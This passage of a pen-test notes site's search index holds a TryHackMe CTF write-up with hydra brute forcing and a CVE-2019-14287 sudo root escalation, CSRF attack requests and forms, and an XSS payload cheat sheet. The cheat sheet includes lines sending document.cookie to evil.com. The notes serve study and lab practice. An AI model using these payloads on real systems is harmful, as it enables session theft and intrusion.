@@ -1,0 +1,650 @@
+{"0": {
+    "doc": "Agent Sudo CTF",
+    "title": "Agent Sudo CTF",
+    "content": ". Starting off with a normal scan: nmap -sCV -v -oN gives us information on 3 ports: . | Port | Service | Version | Description | . | 80/tcp | Apache httpd (Ubuntu) | 2.4.29 | Apache web server supporting GET HEAD POST OPTIONS | . | 22/tcp | ssh | OpenSSH 7.6p1 | SSH | . | 21/tcp | ftp | vsftpd 3.0.3 | FTP served using vsftpd | . Looking at the webserver, we need to send a codename as the user-agent in a request to access a secret page. ![[Pasted image 20231029150714.png]] . When we use user-agent: R we get a hint which suggests we are looking for a limited number of agents: . What are you doing! Are you one of the 25 employees? If not, I going to report this incident . Using Berp Intruder, I iterated through the capitalised alphabet and what do you know… user-agent: C redirects us to a new page! ![[Pasted image 20231029151546.png]] . Now we know a possible username: chris we can attempt to brute-force the FTP credentials, using hydra we get out: login: chris password: crystal. Login in via FTP we can get 3 files (2 image files of aliens, and a text file containing a message to agent J): . Dear agent J, All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you. From, Agent C . Doing an exiftool cutie.png suggests a warning that Trailer data after PNG IEND chunk exists. This is worth investigating as some data could be hidden here. Looking at the hex of this picture with xxd cutie.png we see a reference To_agentR.txt. It seems like there is a text file embedded in this image. Using binwalk cutie.png we can see there is a Zip archive hidden inside the image. Once extracted we can see that inside the Zip is the To_agentR.txt file but it is locked behind a password. Time to brute force it. Preparing with zip2john 8702.zip &gt; hash.txt we can obtain the hash of the zip ready for john hash.txt. Revealing the file password is alien. Unlocking the file tells us: . Agent C, We need to send the picture to 'QXJlYTUx' as soon as possible! By, Agent R . Base64’ing that string reveals it as Area51. Looking into the other image, maybe something is hidden in there? Running steghide extract -sf cute-alien.jpg -p Area51 we extract a message.txt, reading: . Hi james, Glad you find this message. Your login password is hackerrules! Don't ask me why the password look cheesy, ask agent R who set this password for you. Your buddy, chris . Interestingly we now have a new name and password… Maybe they also have an FTP login? After trying to login via FTP it failed so maybe its an SSH login? . Successfully logged into SSH with james and hackerrules! . First we can find the user flag in the home dir. Finally privilege escalation is required to access the root dirs. Some information gathering of the system can point us in the right direction for finding a priv esc: . cat /etc/*-release . DISTRIB_ID=Ubuntu DISTRIB_RELEASE=18.04 DISTRIB_CODENAME=bionic DISTRIB_DESCRIPTION=\"Ubuntu 18.04.3 LTS\" NAME=\"Ubuntu\" VERSION=\"18.04.3 LTS (Bionic Beaver)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 18.04.3 LTS\" VERSION_ID=\"18.04\" HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" VERSION_CODENAME=bionic UBUNTU_CODENAME=bionic . sudo -l . User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash . The (ALL, !root) /bin/bash seems interesting… What this is telling us is that the user cannot run /bin/bash as root (!root). This is explitable under https://nvd.nist.gov/vuln/detail/CVE-2019-14287. It suggests that the specification is: . root ALL=(ALL:ALL) ALL james ALL=(ALL,!root) /bin/bash . With ALL specified it means that a user (james) can run /bin/bash as any user they wish. Therefore we can choose to run /bin/bash as the root user which will be allowed. sudo -u#-1 /bin/bash in this version of sudo, specifying the user id as -1 or 4294967295 are resolved to 0, which is the user ID for root. Finally we have gained full root access and retrieved the final flag found under the /root dir. ",
+    "url": "/pen-test-docs/Practice-Labs/tryhackme/Agent%20Sudo%20CTF.html",
+    "relUrl": "/Practice-Labs/tryhackme/Agent%20Sudo%20CTF.html"
+  },"1": {
+    "doc": "Application Security Testing Methods",
+    "title": "Application Security Testing Methods",
+    "content": ". | Static Application Security Testing (SAST) | Dynamic Application Security Testing (DAST) | Interactive Application Security Testing (IAST) | Out-of-Band Application Security Testing (OAST) . | Advantages | Disadvantages | . | . A combination of this methods is necessary for effective testing of an application, no one method can cover everything or every possible context. A mix of DAST &amp; IAST is often very common. ",
+    "url": "/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html",
+    "relUrl": "/Knowledge/Testing/Application%20Security%20Testing%20Methods.html"
+  },"2": {
+    "doc": "Application Security Testing Methods",
+    "title": "Static Application Security Testing (SAST)",
+    "content": " ",
+    "url": "/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#static-application-security-testing-sast",
+    "relUrl": "/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#static-application-security-testing-sast"
+  },"3": {
+    "doc": "Application Security Testing Methods",
+    "title": "Dynamic Application Security Testing (DAST)",
+    "content": " ",
+    "url": "/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#dynamic-application-security-testing-dast",
+    "relUrl": "/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#dynamic-application-security-testing-dast"
+  },"4": {
+    "doc": "Application Security Testing Methods",
+    "title": "Interactive Application Security Testing (IAST)",
+    "content": "IAST focuses on how an activity “interacts” with the application functionality while it runs. The core of an IAST tool is sensor modules. These modules keep track of application behaviour while the tests are running. These sensors often have access to: . | Entire code base | Dataflow and control flow | System configuration data | Web components | Back-end connection data | . Unlike SAST &amp; DAST methods, which view the application in isolation (without context of other external security measures), IAST looks as all the components and systems the application interacts with at runtime. A typical IAST works as: . | Instrumentation: The IAST deploys sensors &amp; agents alongside the application. These insert into the application’s code or runtime environment. They monitor and trace the flow of data and method calls between components. | Runtime Analysis: As the application runs, the IAST collects data on how the components interact, including data flow and control flow. This helps identify security issues that arise due to the integration of various components. | Vulnerability Detection: The IAST agents analyse the collected data to detect security vulnerabilities. By understanding the runtime behaviour, IAST can provide accurate vulnerability identification and reduce false positives. | Real-time Feedback: As IAST’s operate at runtime, they can provide real-time feedback. This enables quick identification of security issues. | . This can be particularly effective for identifying vulnerabilities when combined with OAST methods. ",
+    "url": "/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#interactive-application-security-testing-iast",
+    "relUrl": "/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#interactive-application-security-testing-iast"
+  },"5": {
+    "doc": "Application Security Testing Methods",
+    "title": "Out-of-Band Application Security Testing (OAST)",
+    "content": "OAST, like DAST is testing a running application with carefully crafted payloads. Although, this method is primarily for automated scanning, it can be performed manually if required. The main benefit of this method is to detect invisible (blind) vulnerabilities with a high accuracy. The process consists of sending attack payloads to a target which cause an interaction with an external system that is in the tester’s control, that sits outside the target domain. Because the tester has insight into the external server, the requests the target application makes can be examined and can be used to detect blind vulnerabilities (as well as standard ones too). Advantages . | As it is a form of DAST, this process rarely produces false positives meaning the reports can be trusted. | It can find a greater number of vulnerabilities than of DAST as it has a wider number of tests it can conduct. | Like DAST, it doesn’t require specific language implementations (unlike SAST) so you only require one scanner for many applications. | . Disadvantages . | No scanner or testing method can ever be perfect, some vulnerabilities will be missed. | Like DAST, it only views the application in isolation. | . ",
+    "url": "/pen-test-docs/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast",
+    "relUrl": "/Knowledge/Testing/Application%20Security%20Testing%20Methods.html#out-of-band-application-security-testing-oast"
+  },"6": {
+    "doc": "Attacks",
+    "title": "Attacks",
+    "content": " ",
+    "url": "/pen-test-docs/Attacks/Attacks%20Index.html",
+    "relUrl": "/Attacks/Attacks%20Index.html"
+  },"7": {
+    "doc": "Bandit Lab",
+    "title": "Bandit Practice Game",
+    "content": "Lab Link . ",
+    "url": "/pen-test-docs/Practice-Labs/overthewire/Bandit.html#bandit-practice-game",
+    "relUrl": "/Practice-Labs/overthewire/Bandit.html#bandit-practice-game"
+  },"8": {
+    "doc": "Bandit Lab",
+    "title": "Level 5",
+    "content": "Find a file that has certain properties: . | Human-readable | 1033 bytes | not executable | . Can use the find command following this helpful doc . find ./ -type f -size 1033c -perm /666 . find ./ - specifies to look in the current dir and any subdirs -type f - specifies to look for files -size 1033c - specifies to look for a size of 1033 bytes -perm /666 - specifies to look for a file that at least one group has a permission value of 6 (read-write not exec) . ",
+    "url": "/pen-test-docs/Practice-Labs/overthewire/Bandit.html#level-5",
+    "relUrl": "/Practice-Labs/overthewire/Bandit.html#level-5"
+  },"9": {
+    "doc": "Bandit Lab",
+    "title": "Level 6",
+    "content": "Find a file somewhere on the server that has: . | owner user bandit7 | owner group bandit6 | 33 bytes | . find / -type f -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null -exec cat {} + . -user bandit7 -group bandit6 - specifies the owners 2&gt;/dev/null - suppress any errors -exec cat {} + - runs cat on any of the files found . ",
+    "url": "/pen-test-docs/Practice-Labs/overthewire/Bandit.html#level-6",
+    "relUrl": "/Practice-Labs/overthewire/Bandit.html#level-6"
+  },"10": {
+    "doc": "Bandit Lab",
+    "title": "Level 8",
+    "content": "Find unique lines in a file: . cat [file] | sort | uniq -u . ",
+    "url": "/pen-test-docs/Practice-Labs/overthewire/Bandit.html#level-8",
+    "relUrl": "/Practice-Labs/overthewire/Bandit.html#level-8"
+  },"11": {
+    "doc": "Bandit Lab",
+    "title": "Bandit Lab",
+    "content": " ",
+    "url": "/pen-test-docs/Practice-Labs/overthewire/Bandit.html",
+    "relUrl": "/Practice-Labs/overthewire/Bandit.html"
+  },"12": {
+    "doc": "Basic SQL Syntax",
+    "title": "Basic SQL Syntax",
+    "content": ". | Database Interaction . | Authentication | Creating the DB | Listing all DB’s | Selecting a DB | Tables . | Creating a table | Listing all tables | Table Properties | . | . | SQL . | Syntax . | Manipulation . | Column Constaints | . | Queries | Aggregate Functions | Multiple Tables | . | . | . SQL syntax can differ between RDBMS but they all follow the ISO Standard. SQL can be used to perform the following actions: . | Retrieve data | Update data | Delete data | Create new tables and databases | Add / remove users | Assign permissions to these users | . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/Basic%20SQL%20Syntax.html",
+    "relUrl": "/Attacks/sql-injection/Basic%20SQL%20Syntax.html"
+  },"13": {
+    "doc": "Basic SQL Syntax",
+    "title": "Database Interaction",
+    "content": "Authentication . mqsql -u root -p . Note: we do not pass the -p with the password as the password could be stored in plain text in the bash_history file. Instead it will prompt us to securely enter the password. Tip: if a password is passed, there should be no space eg. -p&lt;password&gt; . By default the localhost address will be used if not passed, otherwise a host &amp; port can be passed using -h &lt;host&gt; -P &lt;port&gt; . The default port for MySQL/MariaDB is (3306) . Creating the DB . Once authentiacted you can create a database with: . CREATE DATABASE users; &gt; Query OK, 1 row affected (0.02 sec) . SQL expects all queries to end with a ; . Listing all DB’s . SHOW DATABASES; . You will get a list of all the available databases . +--------------------+ | Database | +--------------------+ | information_schema | mysql | performance_schema | sys | users | +--------------------+ . Selecting a DB . USE users; &gt; Database changed . SQL commands aren’t case sensitive but the passed fields are . Tables . Databases store data in the form of tables, containing rows and columns with the intersections being cells. Created with a fixed set of columns. Column datatypes define what value can be stored. Common types are numbers, strings, date, time, and binary data. Other datatypes can be specific to the DBMS. MySQL’s full list of types can be found here . Creating a table . CREATE TABLE logins ( id INT, username VARCHAR(100), password VARCHAR(100), date_of_joining DATETIME ); . Listing all tables . SHOW TABLES; +-----------------+ | Tables_in_users | +-----------------+ | logins | +-----------------+ . DESCRIBE can also be used to get information on a table . DESCRIBE logins; +-----------------+--------------+ | Field | Type | +-----------------+--------------+ | id | int | username | varchar(100) | password | varchar(100) | date_of_joining | date | +-----------------+--------------+ . Table Properties . There are lots of properties that can be used when creating a table. eg. we can have the id field AUTO_INCREMENT . id INT NOT NULL AUTO_INCREMENT, . NOT NULL makes a field required (therefore never empty) UNIQUE also makes sure that its always a unique value being entered . username VARCHAR(100) UNIQUE NOT NULL, . NOW() gets the current datetime DEFAULT specifies the default value . date_of_joining DATETIME DEFAULT NOW(), . Finally we need to set a PRIMARY KEY for our table . PRIMARY KEY (id) . Our final create table would then look like: . CREATE TABLE logins ( id INT NOT NULL AUTO_INCREMENT, username VARCHAR(100) UNIQUE NOT NULL, password VARCHAR(100) NOT NULL, date_of_joining DATETIME DEFAULT NOW(), PRIMARY KEY (id) ); . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/Basic%20SQL%20Syntax.html#database-interaction",
+    "relUrl": "/Attacks/sql-injection/Basic%20SQL%20Syntax.html#database-interaction"
+  },"14": {
+    "doc": "Basic SQL Syntax",
+    "title": "SQL",
+    "content": ". | Case insensitive keyword-based language | Statements can be separated with a ; | Cheat Sheet | . Syntax . Manipulation . | CREATE DATABASE - creates a new database | ALTER DATABASE - modifies a database | CREATE TABLE - creates a new table | ALTER TABLE - modifies a table | DROP TABLE - deletes a table | CREATE INDEX - creates an index (search key) | DROP INDEX - deletes an index | UPDATE - updates data in a database (UPDATE {table} SET {column_1} = {value_1}, ... ;) | INSERT INTO - inserts new data into a database (INSERT INTO {table} ({column_1}, ... ) VALUES ({value_1, ... };)) | DELETE - deletes data from a database Column Constaints . | PRIMARY KEY - constraint can be used to uniquely identify the row | UNIQUE - columns have a different value for every row. | NOT NULL - columns must have a value. | DEFAULT - assigns a default value for the column when no value is specified. | . Queries . | SELECT - Extracts data from a database | FROM - Name(s) of table(s) to retrieve from | WHERE - Filter the results . | Operators: . | = - Equals | &gt; - Greater than | &lt; - Less than | &gt;= - Greater or equal | &lt;= - Less or equal | &lt;&gt; - Not equal | BETWEEN - Range | LIKE - Pattern . | % - wildcard that matches zero or more unspecified characters | _ - wildcard that matches a single unspecified character | . | IN - Multiple possible values | IS NULL - Tests for if Null (can be IS NOT NULL) | . | . | ORDER BY - Sort the results (Sorts by ascending by default, DESC can be specified to reverse ORDER BY ... ASC|DESC) | GROUP BY - Group results by identical values | DISTINCT - Selects only distinct (unique) values SELECT DISTINCT ... FROM ... ; | LIMIT - limit the number of rows in a result set | AND | OR | NOT | AS - rename a column in the result set Aggregate Functions . | COUNT() - Counts a column’s number of records | SUM() - returns the sum of all a column’s values | MAX() - returns the max value of a column | MIN() - returns the min value of a column | AVG() - returns the average value of a column | HAVING - extension of GROUP BY to further filter the results, often used to filter by an aggregate function | ROUND() - round a value to a specific number of places | . Multiple Tables . | LEFT JOIN - joins two tables in a result set based on a condition | WITH - stores the result in a temporary table | UNION - combines results from multiple SELECT statements | CROSS JOIN - combines rows from each row in one table with each row in another table in the result set | JOIN - combine results from multiple tables based on a common column | . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/Basic%20SQL%20Syntax.html#sql",
+    "relUrl": "/Attacks/sql-injection/Basic%20SQL%20Syntax.html#sql"
+  },"15": {
+    "doc": "Containers",
+    "title": "Containers",
+    "content": ". | Docker | Vagrant | . An isolated group of processes running on a single host that corresponds to a complete application, including its configuration and dependencies. A container isn’t a VM as it doesn’t contain its operating system or kernel. Therefore are not a virtualized operating system. They are also referred to as application virtualization in this context. | Virtual Machine | Container | . | Contain applications and the complete OS | Contain applications and only the necessary OS components such as libs and bins | . | A hypervisor provides virtualization | The OS within the container engine provides its own virtualization | . | Multiple VMs run in isolation from each other on a physical server | Several containers run isolated from each other on one operating system | . Docker . Docker is an open-source software that can isolate applications in containers. Docker stores programs together with their dependencies in images. Vagrant . Vagrant is a tool that can create, configure and manage virtual machines or vm environments. The VMs are created and configured using a Vagrantfile. ",
+    "url": "/pen-test-docs/setting-up/Containers.html",
+    "relUrl": "/setting-up/Containers.html"
+  },"16": {
+    "doc": "Courses",
+    "title": "Courses",
+    "content": " ",
+    "url": "/pen-test-docs/Courses/Courses%20Index.html",
+    "relUrl": "/Courses/Courses%20Index.html"
+  },"17": {
+    "doc": "Cross-Site Request Forgery (CSRF)",
+    "title": "Cross-Site Request Forgery (CSRF)",
+    "content": ". | Common flaws in CSRF token validation . | Validation depends on request method | Validation depends on token being present | CSRF token is not tied to the user session | CSRF token is tied to a non-session cookie | CSRF token is simply duplicated in a cookie | . | Executing a CSRF attack . | CSRF vulnerability with no defences | . | . A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. A common way to share CSRF tokens with the client is to include them as a hidden parameter in a HTML form, for example: . &lt;form name=\"change-email-form\" action=\"/my-account/change-email\" method=\"POST\"&gt; &lt;label&gt;Email&lt;/label&gt; &lt;input required type=\"email\" name=\"email\" value=\"example@normal-website.com\"&gt; &lt;input required type=\"hidden\" name=\"csrf\" value=\"50FaWgdOhi9M9wyna8taR1k3ODOR8d6u\"&gt; &lt;button class='button' type='submit'&gt; Update email &lt;/button&gt; &lt;/form&gt; . Some applications place CSRF tokens in HTTP headers, the way the tokens are transmitted have significant impact on the security mechanism as a whole. More info, How to prevent CSRF vulnerabilities. When implemented correctly, CSRF Tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of a victim. ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html"
+  },"18": {
+    "doc": "Cross-Site Request Forgery (CSRF)",
+    "title": "Common flaws in CSRF token validation",
+    "content": "CSRF vulnerabilities typically arise due to flawed validation of CSRF tokens. Validation depends on request method . Some applications validate the token when a POST method is used but skip validation when a GET method is used. The attacker can switch to the GET method to bypass the validation and deliver a CSRF attack: . GET /email/change?email=pwned@evil-user.net HTTP/1.1 Host: vulnerable-website.com Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm . Validation depends on token being present . Some applications only validate if a token is present but skip validation if no token is supplied . POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 25 Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm email=pwned@evil-user.net . CSRF token is not tied to the user session . Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack. CSRF token is tied to a non-session cookie . In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together: . POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 68 Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&amp;email=wiener@normal-user.com . This situation is harder to exploit but is still vulnerable. If the web site contains any behaviour that allows an attacker to set a cookie in a victim’s browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behaviour to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack. The cookie-setting behaviour does not even need to exist within the same web application as the CSRF vulnerability. Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on staging.demo.normal-website.com could be leveraged to place a cookie that is submitted to secure.normal-website.com. CSRF token is simply duplicated in a cookie . In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the “double submit” defence against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state: . POST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 68 Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&amp;email=wiener@normal-user.com . In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn’t need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behaviour to place their cookie into the victim’s browser, and feed their token to the victim in their CSRF attack. ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html#common-flaws-in-csrf-token-validation",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html#common-flaws-in-csrf-token-validation"
+  },"19": {
+    "doc": "Cross-Site Request Forgery (CSRF)",
+    "title": "Executing a CSRF attack",
+    "content": "CSRF vulnerability with no defences . Created a webpage that submitted a form as a POST request that contained a secret input with the vulnerable field to the endpoint of a change-email action. Then a link to this website was added in a comment so if a user clicked it, it would send the request and it would just use their previous session token that the browser remembers. &lt;form method=\"POST\" action=\"https://wwww.example.net/my-account/change-email\"&gt; &lt;input type=\"hidden\" name=\"email\" value=\"hacked@exploit.com\"&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; . ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html#executing-a-csrf-attack",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Request%20Forgery%20(CSRF).html#executing-a-csrf-attack"
+  },"20": {
+    "doc": "Cross-Site Scripting (XSS)",
+    "title": "Cross-Site Scripting (XSS)",
+    "content": ". | Reflective XSS | Stored XSS | DOM-Based XSS | Impacts of XSS | Exploiting XSS . | XSS Cheatsheet . | XSS Locators | Classic Payloads | HTML Tags | . | Useful Example Situations . | Bypass Angle Bracket Filter | String Subtraction Injection | . | . | . Cross-Site Scripting is a type of injection where JavaScript code can be injected into a website. A XSS attack is where an attacker has embedded malicious code, often in the form of a browser-side script that is then sent to an unsuspecting user when they request the webpage. These attacks can occur anywhere a web application uses input from a user within the output it generates without validating or encoding it. The malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page. There are 3 types of XSS attacks: . | Reflective XSS - Injected code is reflected back to a user by the web application | Stored XSS - The injected code is stored on the webserver and is requested by the user | DOM-Based XSS - The injected code manipulates the client-side DOM, resulting in the execution of code on the victim’s browser. | . ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html"
+  },"21": {
+    "doc": "Cross-Site Scripting (XSS)",
+    "title": "Reflective XSS",
+    "content": "Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable website, which reflects the attack back to the user’s browser. The browser then executes this as it appears to have come from a ‘Trusted’ server. This can lead to various security issue, such as stealing user information (eg. credentials or tokens) or performing unauthorised actions on behalf of a user. These attacks are often initiated by creating malicious links or forms that exploit vulnerabilities in the target application. Sometimes referred to as Non-Persistent or Type-II XSS. ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#reflective-xss",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#reflective-xss"
+  },"22": {
+    "doc": "Cross-Site Scripting (XSS)",
+    "title": "Stored XSS",
+    "content": "Stored attacks are those where the injected script is permanently stored on the target server, such as in a database, comment section, message forum etc. The victim then retries the script from the server when it requests the stored information. Unlike reflective XSS, the injected code is not reflected back immediately but rather stored on the target server and delivered to other users later. This makes stored XSS attacks particularly dangerous, as the malicious code affects multiple users and can lead to unauthorized access, data theft, or even complete website compromise. Sometimes referred to a Persistent or Type-II XSS. ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#stored-xss",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#stored-xss"
+  },"23": {
+    "doc": "Cross-Site Scripting (XSS)",
+    "title": "DOM-Based XSS",
+    "content": "This attack occurs when an attacker injects and manipulates malicious code into the Document Object Model (DOM) of a webpage. In DOM-Based XSS attacks the malicious injected code is usually executed by JavaScript directly in the victim’s browser, without being sent to the server. The vulnerable webpage often includes JavaScript that reads data from the URL or user input and then dynamically updates the DOM, but fails to properly sanitize or validate the input, allowing injected code to be executed. ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#dom-based-xss",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#dom-based-xss"
+  },"24": {
+    "doc": "Cross-Site Scripting (XSS)",
+    "title": "Impacts of XSS",
+    "content": ". | Impersonating or masquerading as the victim user | Hijacking a user’s session | Perform unauthorized actions on behalf of the user | Steal sensitive information | Perform phishing attacks | Capture user credentials | Capture keystrokes | Deface the website / Edit its content | Inject trojan functionality into the website | . ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#impacts-of-xss",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#impacts-of-xss"
+  },"25": {
+    "doc": "Cross-Site Scripting (XSS)",
+    "title": "Exploiting XSS",
+    "content": "When exploiting an XSS vulnerability, you need to understand how the application behaves towards specific payloads. The following checklist can be used before exploiting an XSS vulnerability: . | Find the backlisted/filtered characters. XSS locations can be used for this: '';! - \"&lt;XSS&gt;=&amp;{()} | Observe what tags are blocked by Web Application Firewall (WAF) and which keywords are allowed (iframe, img, body etc.) | Try character encoding (URL encoding, Double URL encoding, UTF-8 Unicode encoding, Long UTF-8 Unicode encoding, Hex encoding etc.) | Try XSS using HTML quote encapsulation | Try URL string evasion | Create the payload list according to the allowed keywords | Brute-force the application with the XSS payload list you just created | . Note: Double URL encoding can be tried since the first decoding process is performed by HTTP protocol and the resultant encoded URL will bypass the XSS filter. XSS Cheatsheet . A very useful OWASP XSS cheatsheet. Another useful cheatsheet repo &amp; other links . XSS Locators . '';!--\"&lt;XSS&gt;=&amp;{()} . Classic Payloads . &lt;svg/onload=alert(1)&gt; &lt;script&gt;alert(1)&lt;/script&gt; &lt;script &gt;alert(1)&lt;/script&gt; &lt;ScRipT&gt;alert(1)&lt;/scRipT&gt; &lt;%00script&gt;alert(1)&lt;/script&gt; &lt;script&gt;al%00ert(1)&lt;/script&gt; . HTML Tags . &lt;img/src=x a='' onerror=alert(1)&gt; &lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;\"&gt; &lt;img src=`x`onerror=alert(1)&gt; &lt;img src='/' onerror='alert(\"kalisa\")'&gt; &lt;IMG SRC=# onmouseover=\"alert('xss')\"&gt; &lt;IMG SRC= onmouseover=\"alert('xss')\"&gt; &lt;IMG onmouseover=\"alert('xss')\"&gt; &lt;BODY ONLOAD=alert('XSS')&gt; &lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\"&gt; &lt;SCRIPT SRC=http:/evil.com/xss.js?&lt; B &gt; \"&gt;&lt;XSS&lt;test accesskey=x onclick=alert(1)//test &lt;svg&gt;&lt;discard onbegin=alert(1)&gt; &lt;script&gt;image = new Image(); image.src=\"https://evil.com/?c=\"+document.cookie;&lt;/script&gt; &lt;script&gt;image = new Image(); image.src=\"http://\"+document.cookie+\"evil.com/\";&lt;/script&gt; . The javascript:alert(1); can be injected to run in-line java (eg. in a URL) . Useful Example Situations . Bypass Angle Bracket Filter . In a Reflective XSS where the &lt; &amp; &gt; are both blacklisted/encoded. You can still inject code if the user input is injected within a tag already. This relies on the \" not being escaped as &amp;quot. \" onmouseover=\"alert(1) . Would result in something like a search box like: . &lt;input type=text placeholder='Search the blog...' name=search value=\"\"&gt; . Being turned into: . &lt;input type=text placeholder='Search the blog...' name=search value=\"\" onmouseover=\"alert(1)\"&gt; . String Subtraction Injection . If a variable is set of the user input eg. var userInput = ''; . If you then take a string and subtract a function from it, it will in turn run the function. Eg. var userInput = ''-alert(1)-''; . So the payload would be '-alert(1)-' . ",
+    "url": "/pen-test-docs/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#exploiting-xss",
+    "relUrl": "/Attacks/web-application/Cross-Site%20Scripting%20(XSS).html#exploiting-xss"
+  },"26": {
+    "doc": "Directory Enumeration Attack",
+    "title": "Directory Enumeration Attack",
+    "content": ". Brute-forces potential pages on a site by searching for a common page name from a wordlist. This can allow you to find potentially hidden or unsecure pages. (Kali@Kali) $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'html,php,txt' -t 100 -u 'URL' . With gobuster you need to specify a URL (-u) &amp; Wordlist (-w) optional useful arguments are: . | -x file types to search for eg. &lt;URL&gt;/&lt;word_from_wordlist&gt;.html | -t allows you to specify the number of threads to run the brute force on | . Can also be done with the python based software dirsearch: . (Kali@Kali) $ dirsearch -u https://www.example.com . ",
+    "url": "/pen-test-docs/Attacks/web-application/Directory%20Enumeration%20Attack.html",
+    "relUrl": "/Attacks/web-application/Directory%20Enumeration%20Attack.html"
+  },"27": {
+    "doc": "Empire: Breakout CTF",
+    "title": "Empire: Breakout CTF",
+    "content": ". | Recon | Scanning | Exploitation | . Box Link: https://www.vulnhub.com/entry/empire-breakout,751/ . Difficulty: Easy . ",
+    "url": "/pen-test-docs/Practice-Labs/vulnhub/Empire%20-%20Breakout.html",
+    "relUrl": "/Practice-Labs/vulnhub/Empire%20-%20Breakout.html"
+  },"28": {
+    "doc": "Empire: Breakout CTF",
+    "title": "Recon",
+    "content": ". | Requires a username &amp; password | No feedback given upon failure | . ",
+    "url": "/pen-test-docs/Practice-Labs/vulnhub/Empire%20-%20Breakout.html#recon",
+    "relUrl": "/Practice-Labs/vulnhub/Empire%20-%20Breakout.html#recon"
+  },"29": {
+    "doc": "Empire: Breakout CTF",
+    "title": "Scanning",
